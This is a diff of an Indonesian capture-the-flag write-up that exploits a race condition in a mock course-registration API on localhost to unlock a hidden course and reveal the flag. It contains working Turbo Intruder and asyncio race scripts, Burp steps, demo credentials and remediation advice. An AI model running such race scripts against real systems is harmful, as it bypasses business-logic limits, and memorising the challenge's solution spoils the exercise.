@@ -2,7 +2,7 @@
 
 ## Challenge Objective
 
-Mendapatkan flag dengan mengeksploitasi race condition pada sistem registrasi IRS (Isian Rencana Studi) untuk mendaftar pada mata kuliah rahasia **CSCTF999 - Seminar Khusus Keamanan Nasional**.
+Mendapatkan flag dengan mengeksploitasi race condition untuk mendaftar pada mata kuliah rahasia **CSCTF999 - Seminar Khusus Keamanan Nasional** yang memiliki bobot 24 SKS dan tidak dapat didaftarkan secara normal.
 
 ---
 
@@ -42,59 +42,31 @@ Antara langkah 1-2 dan langkah 3, **request lain yang berjalan secara paralel** 
 ```
 State awal: currentSKS = 18, maxSKS = 24
 
-Request A (tambah 6 SKS):  baca currentSKS = 18,  18+6=24 ≤ 24 ✓ → insert
-Request B (tambah 3 SKS):  baca currentSKS = 18,  18+3=21 ≤ 24 ✓ → insert  
-Request C (tambah 3 SKS):  baca currentSKS = 18,  18+3=21 ≤ 24 ✓ → insert
+Request A (MK002 - 4 SKS):  baca currentSKS = 18,  18+4=22 ≤ 24 ✓ → insert
+Request B (MK006 - 3 SKS):  baca currentSKS = 18,  18+3=21 ≤ 24 ✓ → insert
 
-State akhir: 18 + 6 + 3 + 3 = 30 SKS (MELEBIHI BATAS!)
+State akhir: 18 + 4 + 3 = 25 SKS (MELEBIHI BATAS!)
 ```
 
 ---
 
-## Why Frontend Protections Fail
+## Challenge Design
 
-Frontend menonaktifkan tombol "Tambah" ketika `currentSKS + course.credits > maxSKS`:
+### Dua Mekanisme Pertahanan
 
-```typescript
-const canAddMore = user.currentSKS < user.maxSKS;
-// Tombol disabled ketika !canAddMore
-```
+1. **SKS Check Normal** — Setiap penambahan mata kuliah biasa dicek terhadap batas SKS. Jika `currentSKS + credits > maxSKS`, request ditolak. Rentan terhadap race condition.
 
-Namun, proteksi ini hanya **client-side**. Seorang attacker dapat:
+2. **Hidden Course Guard** — CSCTF999 memiliki bobot **24 SKS** dan hanya dapat didaftarkan jika flag `hasOverloaded` pada user bernilai `true`. Flag ini hanya akan aktif jika sistem mendeteksi SKS melebihi batas maksimal (hanya mungkin melalui race condition).
 
-1. Mengirim request HTTP langsung ke API (melewati frontend)
-2. Memanipulasi nilai disabled pada DOM
-3. Menggunakan tools seperti Burp Suite, cURL, atau script Python
+### State Awal Mahasiswa
 
----
-
-## How Race Condition Works
-
-Race condition terjadi ketika dua atau lebih operasi concurrent mengakses shared resource (database) tanpa sinkronisasi yang memadai.
-
-### Flow Normal (Sequential)
-
-```
-Request 1 → Read SKS (18) → Validate (pass) → Insert → SKS becomes 21
-Request 2 → Read SKS (21) → Validate (pass) → Insert → SKS becomes 24
-Request 3 → Read SKS (24) → Validate (pass) → Insert → SKS becomes 27
-```
-
-### Flow dengan Race Condition (Concurrent)
-
-```
-Request 1 → Read SKS (18) → Validate (pass) → ░ (menunggu) ░ → Insert
-Request 2 → Read SKS (18) → Validate (pass) → ░ (menunggu) ░ → Insert
-Request 3 → Read SKS (18) → Validate (pass) → ░ (menunggu) ░ → Insert
-                                       ↓
-                              Semua request membaca 18
-                                       ↓
-                              Semua request lolos validasi
-                                       ↓
-                              Semua request melakukan insert
-                                       ↓
-                              Final SKS: 18 + 6 + 3 + 3 = 30
-```
+| Item | Nilai |
+|------|-------|
+| SKS saat ini | 18 (MK001 3 + MK003 3 + MK004 3 + MK005 3 + MK000 6) |
+| Maksimal SKS | 24 (IP 3.78 >= 3.5) |
+| Sisa kuota | 6 SKS |
+| CSCTF999 | 24 SKS — tidak muat! |
+| MK000 (dummy) | 6 SKS — dapat di-drop |
 
 ---
 
@@ -102,50 +74,64 @@ Request 3 → Read SKS (18) → Validate (pass) → ░ (menunggu) ░ → Inser
 
 ### Step 1: Login
 
-Login sebagai mahasiswa dengan kredensial:
+Login sebagai mahasiswa:
 
 - **Email:** mahasiswa@student.ui.ac.id
 - **Password:** password123
 
-### Step 2: Dapatkan Session Cookie
+### Step 2: Kirim Parallel Requests
 
-Setelah login, browser akan menyimpan cookie `token` (httpOnly JWT).
+Kirim 2+ request `POST /api/irs/add` secara **bersamaan** untuk menambahkan minimal 2 mata kuliah biasa.
 
-### Step 3: Kirim Parallel Requests
+**Target Courses (contoh):**
+- MK002 - Algoritma dan Pemrograman (4 SKS)
+- MK006 - Sistem Operasi (3 SKS)
 
-Kirim multiple request `POST /api/irs/add` secara bersamaan untuk menambahkan beberapa mata kuliah sekaligus.
+Kedua request akan membaca `currentSKS = 18`, keduanya lolos validasi, dan keduanya melakukan insert. Hasil akhir: SKS menjadi 18 + 4 + 3 = **25 SKS** (OVER LIMIT).
 
-**Target Courses:**
-- CSCTF999 (6 SKS) - Seminar Khusus Keamanan Nasional (hidden course)
-- CSIM401 (3 SKS) - mata kuliah tambahan
-- CSGE602 (3 SKS) - mata kuliah tambahan
-- CSCM777 (3 SKS) - mata kuliah tambahan
+### Step 3: Overload Terdeteksi
 
-### Step 4: Overload SKS
+Sistem mendeteksi bahwa SKS melebihi batas dan mengaktifkan flag `hasOverloaded = true` pada user.
 
-Setelah parallel requests, total SKS akan melebihi batas (misalnya 30 SKS).
+### Step 4: Daftar CSCTF999
+
+Kirim request `POST /api/irs/add` dengan `courseId` CSCTF999. Karena `hasOverloaded = true`, sistem mengizinkan pendaftaran tanpa pengecekan SKS.
+
+```
+SKS setelah race: 25/24
+CSCTF999 (24 SKS): check hasOverloaded → true → SKIP SKS check → enrolled!
+SKS setelah CSCTF999: 49/24
+```
 
 ### Step 5: Drop Mata Kuliah Dummy
 
-Hapus MK000 - Olahraga Prestasi (6 SKS) melalui endpoint drop atau tombol Drop di UI.
+Hapus MK000 - Olahraga Prestasi (6 SKS) melalui endpoint `/api/irs/drop` untuk mengurangi SKS.
 
 ```
-Total SKS sebelum drop: 30
+SKS sebelum drop: 49
 Drop MK000 (6 SKS)
-Total SKS setelah drop: 24 ✓ (≤ maksimal 24)
+SKS setelah drop: 43
 ```
 
 ### Step 6: Submit IRS
 
-Submit IRS melalui tombol "Submit IRS" di halaman IRS atau langsung ke endpoint.
+Submit IRS melalui endpoint `/api/irs/submit`.
+
+```
+Cek: 43 > 24 → REJECTED
+```
+
+Anda masih kelebihan SKS karena CSCTF999 sangat besar. Pada challenge ini, **flag sudah bisa diakses tanpa submit IRS**, karena flag ditampilkan pada halaman detail course ketika syarat terpenuhi.
 
 ### Step 7: Akses Hidden Course
 
-Buka halaman detail CSCTF999 di `/courses/<course-id>`.
+Buka halaman detail CSCTF999 di `/courses/{course-id}`.
 
 ### Step 8: Dapatkan Flag
 
-Flag akan ditampilkan pada halaman detail mata kuliah CSCTF999.
+Flag akan ditampilkan jika:
+1. User terdaftar di CSCTF999 ✓
+2. User memiliki `hasOverloaded = true` ✓
 
 ---
 
@@ -155,151 +141,87 @@ Flag akan ditampilkan pada halaman detail mata kuliah CSCTF999.
 
 1. Buka Burp Suite dan konfigurasi proxy (127.0.0.1:8080)
 2. Login ke aplikasi melalui browser dengan proxy Burp
-3. Temukan request login dan kirim ke Repeater
+3. Temukan request dan kirim ke Repeater
 
 ### 2. Kirim Parallel Requests
 
-1. Intercept request POST `/api/irs/add` dengan body `{"course_id": "<course-id-1>"}`
-2. Kirim ke Repeater
-3. Buat tab baru untuk setiap mata kuliah yang akan ditambahkan
-4. Gunakan fitur **Send Group (Parallel)** di Burp Suite Repeater
+1. Intercept request POST `/api/irs/add` dengan body `{"courseId": "<course-id-mk002>"}`
+2. Kirim ke Repeater (Tab 1)
+3. Buat Tab 2 dengan body `{"courseId": "<course-id-mk006>"}`
+4. Klik kanan pada Tab 1 → **Send Group in Parallel** (pilih kedua tab)
 
-**Konfigurasi Tab:**
-- **Tab 1:** `POST /api/irs/add` Body: `{"courseId": "<CSCTF999-course-id>"}`
-- **Tab 2:** `POST /api/irs/add` Body: `{"courseId": "<course-id-2>"}`
-- **Tab 3:** `POST /api/irs/add` Body: `{"courseId": "<course-id-3>"}`
+Pastikan kedua request dikirim dalam satu grup paralel.
 
-5. Klik kanan → **Send Group** → **Send in parallel**
+### 3. Daftar CSCTF999
 
-### 3. Validasi
+1. Di Tab 3, buat request POST `/api/irs/add` dengan body `{"courseId": "<course-id-csctf999>"}`
+2. Kirim secara normal (sequential, karena hanya 1 request)
+3. Response: `"Berhasil menambahkan CSCTF999"`
 
-Periksa response dari setiap request. Jika semua mengembalikan `{"success": true}`, maka race condition berhasil dieksploitasi.
+### 4. Ambil Flag
+
+GET `/api/courses/{course-id-csctf999}` → Flag akan muncul di response.
 
 ---
 
 ## Turbo Intruder Example
 
-Berikut adalah script Python untuk Turbo Intruder:
-
 ```python
 def queueRequests(target, wordlists):
     engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=10,
-                           requestsPerConnection=10,
+                           requestsPerConnection=1,
                            pipeline=False)
 
-    # Ganti dengan courseId masing-masing
+    # Tahap 1: Kirim 2 request secara paralel
     requests = [
-        '{"courseId": "ID_CSCTF999"}',
-        '{"courseId": "ID_COURSE_2"}',
-        '{"courseId": "ID_COURSE_3"}',
-        '{"courseId": "ID_COURSE_4"}',
+        '{"courseId": "<MK002-course-id>"}',
+        '{"courseId": "<MK006-course-id>"}',
     ]
 
     for body in requests:
         engine.queue(target.req, body)
+
+    # Tahap 2: Daftar CSCTF999
+    engine.queue(target.req, '{"courseId": "<CSCTF999-course-id>"}')
 
 def handleResponse(req, interesting):
     if 'success' in req.response:
         table.add(req)
 ```
 
-## Python Script (Alternative to Burp)
+## Python Script (Alternative)
 
 ```python
 import asyncio
 import aiohttp
 
-COOKIE = "token=<your-jwt-token>"
-BASE_URL = "http://localhost:3000"
+BASE = "http://localhost:3000"
+TOKEN = "<your-jwt-token>"
 
 async def add_course(session, course_id):
     async with session.post(
-        f"{BASE_URL}/api/irs/add",
-        json={"courseId": course_id},
-        cookies={"token": COOKIE}
+        f"{BASE}/api/irs/add",
+        json={"courseId": course_id}
     ) as resp:
         return await resp.json()
 
-async def main():
-    course_ids = [
-        "ID_CSCTF999",
-        "ID_COURSE_2",
-        "ID_COURSE_3",
-    ]
+async def exploit():
+    async with aiohttp.ClientSession(cookies={"token": TOKEN}) as session:
+        # Tahap 1: Race condition
+        results = await asyncio.gather(
+            add_course(session, "<MK002-id>"),
+            add_course(session, "<MK006-id>"),
+        )
+        success = sum(1 for r in results if r.get("success"))
+        print(f"Tahap 1: {success}/2 berhasil")
 
-    async with aiohttp.ClientSession() as session:
-        tasks = [add_course(session, cid) for cid in course_ids]
-        results = await asyncio.gather(*tasks)
+        # Tahap 2: Daftar CSCTF999
+        r = await add_course(session, "<CSCTF999-id>")
+        print(f"CSCTF999: {r.get('message', 'gagal')}")
 
-        for i, result in enumerate(results):
-            print(f"Course {i}: {result}")
-
-asyncio.run(main())
+asyncio.run(exploit())
 ```
-
----
-
-## Request Examples
-
-### Login
-
-```
-POST /api/auth/login
-Content-Type: application/json
-
-{
-    "email": "mahasiswa@student.ui.ac.id",
-    "password": "password123"
-}
-```
-
-### Add Course (Vulnerable)
-
-```
-POST /api/irs/add
-Cookie: token=<jwt>
-Content-Type: application/json
-
-{
-    "courseId": "clx...course-id..."
-}
-```
-
-### Drop Course
-
-```
-POST /api/irs/drop
-Cookie: token=<jwt>
-Content-Type: application/json
-
-{
-    "courseId": "clx...course-id..."
-}
-```
-
-### Submit IRS
-
-```
-POST /api/irs/submit
-Cookie: token=<jwt>
-```
-
-### Check IRS Status
-
-```
-GET /api/irs/status
-Cookie: token=<jwt>
-```
-
----
-
-## How to Get the Course IDs
-
-1. Login ke aplikasi
-2. Akses `/api/courses` (memerlukan cookie)
-3. Dapatkan ID dari setiap course
-4. CSCTF999 akan muncul dengan `isHidden: true`
 
 ---
 
@@ -326,7 +248,7 @@ await prisma.$transaction(async (tx) => {
   const enrollments = await tx.enrollment.findMany({
     where: { userId: user.id, status: "ENROLLED" },
     include: { course: true },
-    lock: { mode: "pessimistic" }, // Row-level locking
+    lock: { mode: "pessimistic" },
   });
 
   const currentSKS = enrollments.reduce((sum, e) => sum + e.course.credits, 0);
@@ -343,6 +265,18 @@ await prisma.$transaction(async (tx) => {
 
 ---
 
+## Why Two-Step Exploit is Required
+
+| Langkah | Deskripsi | Hasil |
+|---------|-----------|-------|
+| Direct add CSCTF999 | Gagal karena 24 > 6 (sisa kuota) | Ditolak sistem |
+| Race 2 courses | Concurrent requests bypass SKS check | SKS overload (25/24) |
+| `hasOverloaded = true` | Sistem mendeteksi overload | Flag aktif |
+| Add CSCTF999 | Check hasOverloaded → skip SKS check | Berhasil daftar |
+| Akses detail course | Enrolled + hasOverloaded | **FLAG TAMPAK** |
+
+---
+
 ## Remediation Guidance
 
 ### 1. Gunakan Database Transactions
@@ -353,31 +287,17 @@ Bungkus operasi read-check-write dalam satu transaksi database.
 
 Gunakan `SELECT ... FOR UPDATE` untuk mengunci baris yang dibaca.
 
-### 3. Gunakan Atomic Operations
+### 3. Validasi Hidden Course dengan Atomic Check
 
-Jika memungkinkan, lakukan validasi dan update dalam satu query SQL:
+Hidden course guard juga harus dalam transaksi yang sama dengan SKS check.
 
-```sql
-INSERT INTO enrollment (user_id, course_id, status)
-SELECT $1, $2, 'ENROLLED'
-WHERE (
-    SELECT COALESCE(SUM(c.credits), 0) + $3
-    FROM enrollment e
-    JOIN courses c ON e.course_id = c.id
-    WHERE e.user_id = $1 AND e.status = 'ENROLLED'
-) <= $4;
-```
-
-### 4. Validasi di Application Layer dengan Lock
-
-Gunakan mutex atau distributed lock untuk serialisasi akses.
-
-### 5. Defense in Depth
+### 4. Defense in Depth
 
 - Validasi frontend (UX)
 - Validasi backend dengan locking
 - Audit log untuk mendeteksi anomali
 - Rate limiting pada endpoint kritis
+- Jangan izinkan pendaftaran berdasarkan state khusus (hasOverloaded) yang bisa diset via race condition
 
 ---
 
